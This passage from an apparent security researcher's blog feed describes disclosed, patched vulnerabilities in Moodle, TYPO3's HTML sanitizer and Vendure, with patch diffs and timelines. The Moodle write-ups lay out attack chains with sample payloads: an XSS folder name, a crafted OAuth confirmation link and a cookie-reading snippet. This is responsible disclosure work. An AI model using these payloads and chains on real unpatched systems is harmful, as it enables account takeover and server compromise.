redirect the user after the login!</p><p>But what is <code>oauth2/confirm-linkedlogin.php</code> and how an attacker would get here?<br>First, we need to understand that this is possible only in a Moodle instance with some kind of OAuth enabled. In it, a user can log in via their OAuth account or link&#x2F;unlink OAuth to an existing account. In case it’s the first OAuth login a new account will be created with linked OAuth. <strong>But</strong> in case there is already an account with the same email address as the OAuth account, Moodle will link those accounts and send this <code>confirm-linkedlogin</code> confirmation link by email.</p><img src="/img/blogs/Moodle/image-4.webp" style="width: 100%;"/><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>Here are the specific number of steps an attacker would need to do to craft an account takeover attack:</p><ol><li><p>The attacker has an account with a controlled email same as the OAuth provider (for example, if Moodle has Google’s OAuth then the email should be a Gmail address). In this demonstration, let’s say an attacker is logged in with <a href="mailto:&#97;&#116;&#x74;&#97;&#x63;&#x6b;&#101;&#x72;&#x40;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#x63;&#111;&#x6d;">&#97;&#116;&#x74;&#97;&#x63;&#x6b;&#101;&#x72;&#x40;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#x63;&#111;&#x6d;</a>. </p></li><li><p>The attacker’s account shouldn’t be linked to OAuth (can be unlinked in the user options in case it’s already linked).</p></li><li><p>Attacker creates a self-XSS payload that logs in using the current browser’s OAuth (done automatically without requiring credentials) using an iframe pointing to:<br><code>/auth/oauth2/login.php?id=2&amp;wantsurl=%2F&amp;sesskey=$&#123;M.cfg.sesskey&#125;</code> (the <code>M.cfg.sesskey</code> is the current session’s CSRF protection). Since the Iframe has the same origin as the main page, the XSS code can freely access the newly created session in the Iframe.</p></li><li><p>An attacker account adds the self-XSS payload to a WYSIWYG input and waits for the autosave.</p></li><li><p>Attacker logs out.</p></li><li><p>The attacker logs in with <strong>OAuth</strong> (using <a href="mailto:&#97;&#x74;&#116;&#97;&#99;&#x6b;&#x65;&#x72;&#x40;&#103;&#109;&#x61;&#x69;&#108;&#46;&#99;&#111;&#x6d;">&#97;&#x74;&#116;&#97;&#99;&#x6b;&#x65;&#x72;&#x40;&#103;&#109;&#x61;&#x69;&#108;&#46;&#99;&#111;&#x6d;</a>). Moodle will see that there is already an account with the same email address and will generate a confirmation URL that links the Moodle account to the OAuth. That URL will be sent by email. </p></li><li><p>Attacker adds the <code>redirect</code> parameter to the URL that will point to the self-XSS containing page: <code>http://moodle-domain/auth/oauth2/confirm-linkedlogin.php?token=...&amp;userid=11&amp;username=...&amp;issuerid=...&amp;redirect=http://moodle-domain/user/edit.php?id=11%231</code></p></li><li><p>Any user who clicks on the newly crafted link will be logged in to the attacker’s account and redirected to the self-XSS page.</p></li></ol><img src="/img/blogs/Moodle/image-5.webp" style="width: 100%;"/><ol start="9"><li>The victim triggers the self-XSS payload in the context of the attacker’s account. It creates a new frame in which the victim is authenticated back in their own account via OAuth. Both the parent document (attacker’s session) and the frame (victim’s session) share the same origin, so the payload has full access to everything inside the frame.</li></ol><img src="/img/blogs/Moodle/image-6.webp" style="width: 100%;"/><ol start="10"><li>From here, the attacker has full control over the victim’s account. For example, using the following iframe’s onload event code will show an alert with the victim’s cookie: <code>alert(&#39;hijacked cookie:&#39; + document.cookie);</code>. Any other action can be done directly in the frame on the victim’s behalf. In case the victim account has admin privileges, code execution on the server can be achieved (as demonstrated in our <a href="https://www.sonarsource.com/blog/playing-dominos-with-moodles-security-1/">previous</a> blog).</li></ol><h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p>The vulnerability was <a href="https://github.com/moodle/moodle/commit/3d3dd827fae6db06f8f2a265ef38cfd5566d0c17">fixed</a> in versions 4.2.2, 4.1.5, 4.0.10, 3.11.16, and 3.9.23 by removing the call to the <code>complete_user_login</code> function, causing the <code>confirm-linkedlogin.php</code> endpoint to not automatically login the user by clicking the link. </p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- if (!$user-&gt;suspended) &#123;</span></span><br><span class="line"><span class="deletion">-         complete_user_login($user);</span></span><br><span class="line"><span class="deletion">-         \core\session\manager::apply_concurrent_login_limit($user-&gt;id, session_id());</span></span><br><span class="line"></span><br><span class="line"><span class="addition">+    if ($user-&gt;id == $USER-&gt;id) &#123;</span></span><br><span class="line">//...</span><br></pre></td></tr></table></figure><p>Clicking a malicious link now will not log in to the attacker’s account and thus no self-XSS is executed on the victim (though stored self-XSS is still possible in the WYSIWYG editor).</p><h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><table><thead><tr><th>Date</th><th>Action</th></tr></thead><tbody><tr><td>2023-03-22</td><td>We report all issues to the vendor</td></tr><tr><td>2023-08-10</td><td>Vendor patched the vulnerability</td></tr><tr><td>2023-08-21</td><td>Vendor released security advisory and CVE-2023-40320 was assigned</td></tr></tbody></table><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>In this article, covering our second critical vulnerability found in Moodle, we demonstrated how attackers can leverage the self-XSS vulnerability to an impactful Account Takeover. Considering that, in addition to our first blog in the series covering another innocent initial bug to RCE, it is important to not overlook those innocuous issues. </p><p>By focusing on clean code practices, developers write software that is clear, maintainable, and understandable. These qualities make it easier to spot and address vulnerabilities during development, reducing the risk of introducing security flaws that could be exploited by attackers. It is important to address all security issues in order to reduce the chance of bug chains.</p><p>We would also like to thank Moodle again for their responsiveness and great communication.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;In our endeavor to enhance the</summary>
      
    
    
    
    
    <category term="moodle" scheme="https://yaniv-git.github.io/tags/moodle/"/>
    
    <category term="ato" scheme="https://yaniv-git.github.io/tags/ato/"/>
    
    <category term="account take over" scheme="https://yaniv-git.github.io/tags/account-take-over/"/>
    
    <category term="oauth" scheme="https://yaniv-git.github.io/tags/oauth/"/>
    
  </entry>
  
  <entry>
    <title>Playing Dominos with Moodle&#39;s Security (1/2)</title>
    <link href="https://yaniv-git.github.io/2023/08/21/Playing%20Dominos%20with%20Moodle&#39;s%20Security%201/"/>
    <id>https://yaniv-git.github.io/2023/08/21/Playing%20Dominos%20with%20Moodle&#39;s%20Security%201/</id>
    <published>2023-08-21T22:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Moodle is an open-source learning management system (LMS) used to create and deliver online courses. It was first developed in 2002 by Martin Dougiamas and is now widely used by educators and institutions around the world, earning the trust of educational institutions worldwide, with its user base exceeding 350 million across 242 countries. </p><p>Moodle provides a platform for teachers and trainers to create online courses and learning materials, manage course content, and interact with students through a range of communication tools such as discussion forums, messaging systems, and more.</p><p>Compromising a Moodle instance could considerably impact schools and universities. From simple grade cheating to infiltrating internal networks, shutting down a whole university, and more. An attacker can potentially cause significant harm to an educational institution.</p><p>This is the first blog in a two-part series where we will present our findings on a Moodle security audit we conducted. We were drawn to researching the security aspect of the framework due to its popularity, with the goal of contributing to a safer internet.</p><p>In this first article, we demonstrate how an unauthenticated attacker can leverage a vulnerability with a supposedly low impact to gain full control over the Moodle instance.</p><h1 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h1><p>Moodle versions 4.1.x before 4.1.3 and 4.2.x before 4.2.0 are susceptible to an unauthenticated arbitrary folder creation, tracked as CVE-2023-30943. An attacker can leverage the creation of arbitrary folders to carry out a Stored Cross-Site Scripting (XSS) attack on the administration panel, resulting in arbitrary code execution on the server as soon as an administrator visits the panel.</p><iframe width="100%" height="414" src="https://www.youtube.com/embed/pevHGKKOsqU" title="Demonstration of Moodle vulnerabilities (CVE-2023-30943) on a test instance" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><h1 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h1><p>In this section, we discuss the origin of the vulnerability and how an attacker can turn an arbitrary folder creation into a Stored Cross-Site Scripting vulnerability and then execute arbitrary commands.</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Like many other applications, Moodle has its own permission&#x2F;authorization levels, using roles such as students, teachers, managers, etc. An administrator account can install arbitrary plugins (PHP code). This feature allows an administrator to execute code on the server by design.</p><p>By default, the register feature is disabled on Moodle: this is mainly because schools usually don’t want random people to register and login into their Moodle, but only their students. For example, only after a student is accepted by a university, they will manually create a Moodle user and provide the student with their login credentials. </p><h1 id="From-arbitrary-folder-creation-to-RCE-CVE-2023-30943"><a href="#From-arbitrary-folder-creation-to-RCE-CVE-2023-30943" class="headerlink" title="From arbitrary folder creation to RCE (CVE-2023-30943)"></a>From arbitrary folder creation to RCE (CVE-2023-30943)</h1><p>Although the attack surface for an unauthenticated attacker is minimal, we found two interesting endpoints that do not require authentication.</p><p>Both of the following endpoints take a <code>RAW</code> typed input from the <code>rev</code> parameter and generate a custom path that includes the provided <code>rev</code> parameter in the middle. Later, a folder will be created on this path if it doesn’t exist. Since the parameter type is <code>RAW</code> (no modification or sanitization by Moodle) and its value is inserted in the middle of the path string, an attacker can create arbitrary folders on the server by using path traversal sequences. Without control over any files (names, paths, nor data) the impact of this weird bug is questionable at first glance. </p><ul><li>lib&#x2F;editor&#x2F;tiny&#x2F;lang.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rev</span>  = <span class="title function_ invoke__">min_optional_param</span>(<span class="string">&#x27;rev&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;RAW&#x27;</span>);</span><br><span class="line"><span class="variable">$lang</span> = <span class="title function_ invoke__">min_optional_param</span>(<span class="string">&#x27;lang&#x27;</span>, <span class="string">&#x27;standard&#x27;</span>, <span class="string">&#x27;SAFEDIR&#x27;</span>);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;candidatefile = <span class="string">&quot;<span class="subst">&#123;$CFG-&gt;localcachedir&#125;</span>/editor_tiny/<span class="subst">&#123;$this-&gt;rev&#125;</span>/lang/<span class="subst">&#123;$this-&gt;lang&#125;</span>/lang.json&quot;</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="variable">$this</span>-&gt;candidatefile), <span class="variable">$CFG</span>-&gt;directorypermissions, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></li><li>lib&#x2F;editor&#x2F;tiny&#x2F;loader.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;rev  = <span class="title function_ invoke__">min_optional_param</span>(<span class="string">&#x27;rev&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;RAW&#x27;</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;filepath = <span class="title function_ invoke__">min_optional_param</span>(<span class="string">&#x27;filepath&#x27;</span>, <span class="string">&#x27;standard&#x27;</span>, <span class="string">&#x27;SAFEPATH&#x27;</span>);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;candidatefile = <span class="string">&quot;<span class="subst">&#123;$CFG-&gt;localcachedir&#125;</span>/editor_tiny/<span class="subst">&#123;$this-&gt;rev&#125;</span>/<span class="subst">&#123;$filepathhash&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="variable">$this</span>-&gt;candidatefile), <span class="variable">$CFG</span>-&gt;directorypermissions, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></li></ul><p>In order to determine ways, how this could be exploited, we can assume that any folder name on the server is equivalent to an attacker’s input. From here we can go over all PHP code, that interacts with folders&#x2F;files and consider them as sources. </p><p>Some of the PHP functions, which should be considered for example:</p><ul><li>glob</li><li>*dir (scandir&#x2F;opendir&#x2F;readdir&#x2F;closedir)</li><li>realpath</li><li>…</li></ul><p>Using this approach, we encountered an interesting code flow. When an admin visits the site administration page the following code is executed:</p><p><code>lib/adminlib.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">glob</span>(<span class="variable">$CFG</span>-&gt;dirroot.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$CFG</span>-&gt;admin.<span class="string">&#x27;/settings/*.php&#x27;</span>) <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span> == <span class="variable">$CFG</span>-&gt;dirroot.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$CFG</span>-&gt;admin.<span class="string">&#x27;/settings/top.php&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span> == <span class="variable">$CFG</span>-&gt;dirroot.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$CFG</span>-&gt;admin.<span class="string">&#x27;/settings/plugins.php&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// plugins are loaded last - they may insert pages anywhere</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">require</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The loop iterates over every file that ends with <code>.php</code> in the <code>admin/settings</code> and tries to <code>require</code> it. An attacker can simply add a folder that ends with <code>.php</code> at <code>/var/www/html/admin/settings/*.php</code> and crash all administration pages. </p><img src="/img/blogs/Moodle/image-1.webp" style="width: 100%;"/><p>This attack on the admin panel is limited to a Denial of Service (DoS), but we were curious, if attackers may even gain RCE.</p><h2 id="XSS-from-arbitrary-folder-creation"><a href="#XSS-from-arbitrary-folder-creation" class="headerlink" title="XSS from arbitrary folder creation"></a>XSS from arbitrary folder creation</h2><p>Moodle offers methods for teachers and students to share learning materials and submissions, which could be in the form of files like word-processed documents or slideshow presentations. By default, Moodle supports a number of file types. An administrator can <a href="https://docs.moodle.org/402/en/Working_with_files#Adding_a_new_file_type">add</a> other file types to their Moodle instance. Doing so requires choosing a corresponding icon that will represent the file type. </p><p>The code at <code>admin/tool/filetypes/classes/utils.php</code> lists the available icons by iterating over the files (<strong>including folders</strong>) that end with <code>.svg</code>&#x2F;<code>.gif</code>&#x2F;<code>.png</code> in a dedicated path: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_icons_from_path</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$icons</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$handle</span> = @<span class="title function_ invoke__">opendir</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">            <span class="keyword">while</span> ((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$matches</span> = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;~(.+?)(?:-24|-32|-48|-64|-72|-80|-96|-128|-256)?\.(?:svg|gif|png)$~&#x27;</span>,</span><br><span class="line">                        <span class="variable">$file</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">                    <span class="variable">$key</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">                    <span class="variable">$icons</span>[<span class="variable">$key</span>] = <span class="variable">$key</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">closedir</span>(<span class="variable">$handle</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">ksort</span>(<span class="variable">$icons</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$icons</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>The name of the files&#x2F;folders are displayed on the page without sanitization (<code>admin/tool/filetypes/edit_form.php</code>):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fileicons</span> = \tool_filetypes\utils::<span class="title function_ invoke__">get_file_icons</span>();</span><br><span class="line"><span class="variable">$mform</span>-&gt;<span class="title function_ invoke__">addElement</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;icon&#x27;</span>, <span class="title function_ invoke__">get_string</span>(<span class="string">&#x27;icon&#x27;</span>, <span class="string">&#x27;tool_filetypes&#x27;</span>), <span class="variable">$fileicons</span>);</span><br></pre></td></tr></table></figure><p>In order to inject malicious JavaScript code, an attacker can create the following folder:<br><code>var/www/html/pix/f/&lt;input&gt;&lt;img src=x onerror=alert(1)&gt;.png</code></p><p>When an admin tries to add a new filetype from the server settings page (<a href="http://moodle-domain/admin/tool/filetypes/edit.php?name=add">http://moodle-domain/admin/tool/filetypes/edit.php?name=add</a>), the folder name is reflected on the HTML page, and the JavaScript payload is executed in the context of the admin account.  Because the folder name is reflected inside a <code>select</code> tag the attacker needs an <code>input</code> tag first to <a href="https://html.spec.whatwg.org/#parsing-main-inselect">break out</a>, causing the <code>img</code> to render and JavaScript to run. This vulnerability can be exploited in a Cross-Site Scripting (XSS) attack against an admin user to achieve remote code execution on the server, as <a href="https://cube01.io/blog/Moodle-DOM-Stored-XSS-to-RCE.html">demonstrated</a> before via plugin installation. </p><p><a href="https://docs.moodle.org/402/en/Installing_plugins">Plugins</a> in Moodle are additional PHP code made to provide custom features and functionalities. Using Moodle’s web interface, admins can conveniently install user <a href="https://moodle.org/plugins/">shared</a> plugins, or install their own from a local zip. Since plugins are simply PHP code, an attacker-controlled plugin is equivalent to arbitrary code execution.</p><p>There are probably other ways to exploit this vulnerability, but this XSS on the “new filetype” page demonstrates how an unauthenticated attacker can execute arbitrary code on the Moodle server by installing a malicious plugin.</p><h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p>The vulnerability was <a href="https://github.com/moodle/moodle/commit/59d42e1ed23f916dcb47d53c745bef18a116d800">fixed</a> in versions 4.1.3 and 4.2.0 by casting the <code>$rev</code> parameter to integers in both files:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">            [$rev, $lang] = explode(&#x27;/&#x27;, $slashargument, 2);</span><br><span class="line"><span class="deletion">-           $rev  = min_clean_param($rev, &#x27;RAW&#x27;);</span></span><br><span class="line"><span class="addition">+           $rev  = min_clean_param($rev, &#x27;INT&#x27;);</span></span><br><span class="line">            $lang = min_clean_param($lang, &#x27;SAFEDIR&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line"><span class="deletion">-           $rev  = min_optional_param(&#x27;rev&#x27;, 0, &#x27;RAW&#x27;);</span></span><br><span class="line"><span class="addition">+           $rev  = min_optional_param(&#x27;rev&#x27;, 0, &#x27;INT&#x27;);</span></span><br><span class="line">            $lang = min_optional_param(&#x27;lang&#x27;, &#x27;standard&#x27;, &#x27;SAFEDIR&#x27;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">            [$rev, $filepath] = explode(&#x27;/&#x27;, $slashargument, 2);</span><br><span class="line"><span class="deletion">-           $this-&gt;rev  = min_clean_param($rev, &#x27;RAW&#x27;);</span></span><br><span class="line"><span class="addition">+           $this-&gt;rev  = min_clean_param($rev, &#x27;INT&#x27;);</span></span><br><span class="line">            $this-&gt;filepath = min_clean_param($filepath, &#x27;SAFEPATH&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line"><span class="deletion">-           $this-&gt;rev  = min_optional_param(&#x27;rev&#x27;, 0, &#x27;RAW&#x27;);</span></span><br><span class="line"><span class="addition">+           $this-&gt;rev  = min_optional_param(&#x27;rev&#x27;, 0, &#x27;INT&#x27;);</span></span><br><span class="line">            $this-&gt;filepath = min_optional_param(&#x27;filepath&#x27;, &#x27;standard&#x27;, &#x27;SAFEPATH&#x27;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>Now, an attacker cannot control the name of a folder nor traverse back directories in order to create arbitrary folders on the server.</p><h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><table><thead><tr><th>Date</th><th>Action</th></tr></thead><tbody><tr><td>2023-03-22</td><td>We report all issues to Vendor</td></tr><tr><td>2023-04-19</td><td>Vendor patched the vulnerability</td></tr><tr><td>2023-05-01</td><td>Vendor released security advisory and CVE-2023-30943 was assigned</td></tr></tbody></table><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>In this article, we showed how an unauthenticated actor could create an arbitrary folder on a Moodle server, an apparently innocuous action, to then trigger a Cross-Site Scripting vulnerability on the administration panel. With existing features of Moodle, this primitive can be turned into Remote Code Execution, ultimately granting an unauthenticated attacker arbitrary code execution on the server. </p><p>In the second article coming on August 29th, we will dive into how attackers could take over accounts by chaining minor vulnerabilities.</p><p>We would also like to thank Moodle for their responsiveness and great communication.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Moodle is an open-source learn</summary>
      
    
    
    
    
    <category term="rce" scheme="https://yaniv-git.github.io/tags/rce/"/>
    
    <category term="moodle" scheme="https://yaniv-git.github.io/tags/moodle/"/>
    
    <category term="unauthenticated" scheme="https://yaniv-git.github.io/tags/unauthenticated/"/>
    
    <category term="unauth" scheme="https://yaniv-git.github.io/tags/unauth/"/>
    
  </entry>
  
  <entry>
    <title>Typo3 HTML Sanitizer By-passing via the noscript tag</title>
    <link href="https://yaniv-git.github.io/2023/07/25/Typo3%20HTML%20Sanitizer%20By-passing%20via%20the%20noscript%20tag/"/>
    <id>https://yaniv-git.github.io/2023/07/25/Typo3%20HTML%20Sanitizer%20By-passing%20via%20the%20noscript%20tag/</id>
    <published>2023-07-25T22:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><p>Due to an encoding issue in the serialization layer, malicious markup nested in a noscript element was not encoded correctly. noscript is disabled in the default configuration, but might have been enabled in custom scenarios. This allows bypassing the cross-site scripting mechanism of typo3&#x2F;html-sanitizer.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>Update to <code>typo3/html-sanitizer</code> versions 1.5.1 or 2.1.2 that fix the problem described.</p><h1 id="Credits"><a href="#Credits" class="headerlink" title="Credits"></a>Credits</h1><p>Thanks to David Klein and Yaniv Nizry who reported this issue, and to TYPO3 security team members Oliver Hader and Benjamin Franzke who fixed the issue.</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><a href="https://typo3.org/security/advisory/typo3-core-sa-2023-002">TYPO3-CORE-SA-2023-002</a></li><li><a href="https://github.com/TYPO3/html-sanitizer/security/advisories/GHSA-59jf-3q9v-rh6g">GHSA-59jf-3q9v-rh6g</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38500">https://nvd.nist.gov/vuln/detail/CVE-2023-38500</a></li><li><a href="https://github.com/TYPO3/html-sanitizer/commit/e3026f589fef0be8c3574ee3f0a0bfbe33d7ebdb">TYPO3&#x2F;html-sanitizer@e3026f5</a></li><li><a href="https://typo3.org/security/advisory/typo3-core-sa-2023-002">https://typo3.org/security/advisory/typo3-core-sa-2023-002</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Problem&quot;&gt;&lt;a href=&quot;#Problem&quot; class=&quot;headerlink&quot; title=&quot;Problem&quot;&gt;&lt;/a&gt;Problem&lt;/h1&gt;&lt;p&gt;Due to an encoding issue in the serialization laye</summary>
      
    
    
    
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
    <category term="mxss" scheme="https://yaniv-git.github.io/tags/mxss/"/>
    
    <category term="bypass" scheme="https://yaniv-git.github.io/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>Vendure Cross Site Request Forgery vulnerability impacting all API requests</title>
    <link href="https://yaniv-git.github.io/2023/07/11/Vendure%20Cross%20Site%20Request%20Forgery%20vulnerability%20impacting%20all%20API%20requests/"/>
    <id>https://yaniv-git.github.io/2023/07/11/Vendure%20Cross%20Site%20Request%20Forgery%20vulnerability%20impacting%20all%20API%20requests/</id>
    <published>2023-07-11T22:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>Vendure is an e-commerce GraphQL framework with a number of APIs and different levels of<br>authorization. By default the Cookie settings are insecure, having the SameSite setting as false<br>which results in not having one (originates from the cookie-session npm package’s default<br>settings).</p><h1 id="Patches"><a href="#Patches" class="headerlink" title="Patches"></a>Patches</h1><p>Update to versions 2.0.3 or above.</p><h1 id="Workarounds"><a href="#Workarounds" class="headerlink" title="Workarounds"></a>Workarounds</h1><p>Manually set the <code>authOptions.cookieOptions.sameSite</code> configuration option to <code>&#39;strict&#39;</code>, <code>&#39;lax&#39;</code> or <code>true</code>.</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>Are there any links users can visit to find out more?</p><ul><li><a href="https://github.com/vendure-ecommerce/vendure/security/advisories/GHSA-h9wq-xcqx-mqxm">GHSA-h9wq-xcqx-mqxm</a></li><li><a href="https://github.com/vendure-ecommerce/vendure/commit/4a10d6785a3bf792ddf84053cdf232c205b82c81">vendure-ecommerce&#x2F;vendure@4a10d67</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Impact&quot;&gt;&lt;a href=&quot;#Impact&quot; class=&quot;headerlink&quot; title=&quot;Impact&quot;&gt;&lt;/a&gt;Impact&lt;/h2&gt;&lt;p&gt;Vendure is an e-commerce GraphQL framework with a numb</summary>
      
    
    
    
    
    <category term="csrf" scheme="https://yaniv-git.github.io/tags/csrf/"/>
    
    <category term="npm" scheme="https://yaniv-git.github.io/tags/npm/"/>
    
  </entry>
  
  <entry>
    <title>@vendure/admin-ui-plugin authenticated XSS</title>
    <link href="https://yaniv-git.github.io/2023/07/03/Vendure%20admin-ui-plugin%20authenticated%20Cross-site%20Scripting/"/>
    <id>https://yaniv-git.github.io/2023/07/03/Vendure%20admin-ui-plugin%20authenticated%20Cross-site%20Scripting/</id>
    <published>2023-07-03T22:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>Vendure provides an authorization system with different levels of privileges. For example, an administrator cannot create another administrator.</p><p>In the admin UI, there are a couple of places with description inputs, such as inventory&#x2F;collection catalog, shipping methods, promotions, and more.</p><p>While the WYSIWYG editor allows limited customization, altering the request data (not in the ui) saves and returns arbitrary HTML with no sanitization. Causing an XSS when viewing the page.</p><p>The impact of this XSS is privilege escalation. A user that can write any type of description can trigger the attack. Then any other user that visits the vulnerable page is prone to arbitrary Javascript code execution, giving the attacker ability to execute actions on behalf of this user.</p><h1 id="Patches"><a href="#Patches" class="headerlink" title="Patches"></a>Patches</h1><p>Update to versions 2.0.3 or above.</p><h1 id="Workarounds"><a href="#Workarounds" class="headerlink" title="Workarounds"></a>Workarounds</h1><p>Is there a way for users to fix or remediate the vulnerability without 